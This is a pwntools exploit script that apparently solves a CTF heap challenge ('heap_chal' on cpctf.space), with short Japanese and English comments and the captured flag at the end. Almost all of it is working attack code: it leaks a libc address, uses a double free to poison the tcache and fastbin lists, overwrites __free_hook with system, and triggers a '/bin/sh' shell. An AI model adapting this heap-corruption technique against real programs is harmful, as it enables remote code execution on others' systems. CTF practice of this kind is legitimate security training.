# blog.y2a.dev/articles/2022/05-08/heap_challenge/
from pwn import *

HOST = "heap-challenge.cpctf.space"
PORT = 30018
file = "./heap_chal"
libc = ELF("./libc.so.6")
context(os = 'linux', arch = 'amd64')
#context.log_level = 'debug'

#io = remote(HOST, PORT)
io = process(file)

arena_top = 0x1ecb80 + 0x60

def new(index: str, msg: str, content: bytes):
    io.sendlineafter(">", "1")
    io.sendlineafter("index> ", index)
    io.sendlineafter("msg_len> ", msg)
    io.sendlineafter("content> ", content)

def edit(index: str, newlen: str, content: bytes =b""):
    io.sendlineafter(">", "2")
    io.sendlineafter("index> ", index)
    io.sendlineafter("new_len> ", newlen)
    if b"inv" in io.recvn(3):
        return
    io.sendlineafter("> ", content)

def show(index: str):
    io.sendlineafter(">", "3")
    io.sendlineafter("index> ", index)

def delete(index: str):
    io.sendlineafter(">", "4")
    io.sendlineafter("index> ", index)

new("0", "16", b"AAAA")
new("1", "1280", b"BBBB")
new("2", "16", b"CCCC")
new("3", "16", b"DDDD")
new("4", "16", b"EEEE")
new("5", "16", b"FFFF")

# leak libc
edit("1", "-1")
show("1")
libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - arena_top
libc_free_hook = libc.sym['__free_hook']
print(f'{libc.address:x}')
print(f'{libc_free_hook:x}')

# fill tcache
# deleteすると、2つ繋がる
delete("0")
delete("2")
delete("3")
edit("4", "-1") # editは1つだけ

# double free
delete("5") #fastbin: 5 -> 5' -> NULL
edit("5", "-1") #fastbin: 5' -> 5 -> 5' -> NULL

new("0", "16", b"XXXX")
new("2", "16", b"YYYY")
new("3", "16", b"ZZZZ")

# tcache: 0' -> NULL
# fastbin: 5' -> 5 -> 5' -> NULL
new("4", "16", p64(libc.sym["__free_hook"])) # 4 = 5'
# tcache: 5 -> 5' -> __free_hook -> NULL

edit("0", "-1") # tcache: 0' -> 5 -> 5' -> __free_hook -> NULL
new("5", "16", b"/bin/sh\x00") # tcache: 5' -> __free_hook -> NULL
new("6", "16", p64(libc.sym["system"]))

delete("5")

io.interactive()
#CPCTF{we_implemented_it_too_freely}
